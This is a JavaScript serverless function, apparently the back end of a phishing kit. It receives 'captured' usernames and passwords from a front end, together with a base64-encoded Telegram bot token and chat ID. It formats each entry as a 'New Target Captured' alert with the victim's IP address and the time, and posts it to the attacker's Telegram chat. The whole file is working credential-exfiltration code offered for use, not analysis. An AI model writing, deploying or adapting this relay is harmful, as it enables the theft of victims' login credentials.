export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { config, data } = req.body;

    // Check if both the Telegram config and the captured data exist
    if (!config || !data) {
        return res.status(400).json({ error: 'Payload missing' });
    }

    try {
        // 1. Decode the Base64 config string into JSON
        // Handle potential URL-encoding issues (space vs +)
        const sanitizedConfig = config.replace(/ /g, '+');
        let decoded;
        try {
            decoded = JSON.parse(Buffer.from(sanitizedConfig, 'base64').toString());
        } catch (e) {
            return res.status(400).json({ error: 'Invalid configuration format' });
        }

        // Validate decoded config has the required keys (t = token, c = chatId)
        if (!decoded.t || !decoded.c) {
            return res.status(400).json({ error: 'Incomplete Telegram configuration' });
        }

        // 2. Extract Client IP correctly for Vercel environment
        const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

        // 3. Format the message for Telegram
        // We use HTML mode instead of Markdown because it's much harder to break with special characters
        const message = `🎯 <b>New Target Captured</b>\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `👤 <b>User:</b> <code>${data.User || 'N/A'}</code>\n` +
                        `🔑 <b>Pass:</b> <code>${data.Pass || 'N/A'}</code>\n` +
                        `━━━━━━━━━━━━━━━\n` +
                        `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
                        `🕒 <b>Time:</b> ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC`;

        // 4. Dispatch to Telegram API
        const tgUrl = `https://api.telegram.org/bot${decoded.t}/sendMessage`;
        
        const response = await fetch(tgUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: decoded.c,
                text: message,
                parse_mode: 'HTML' // Switched to HTML for better stability
            })
        });

        const result = await response.json();

        if (!response.ok) {
            console.error('Telegram API Error Response:', result);
            return res.status(502).json({ 
                error: 'Telegram API Error', 
                details: result.description || 'Check Bot Token/Chat ID permissions' 
            });
        }

        return res.status(200).json({ success: true });
    } catch (err) {
        console.error('Processing Error:', err);
        return res.status(500).json({ error: 'Relay failed to process transmission' });
    }
}
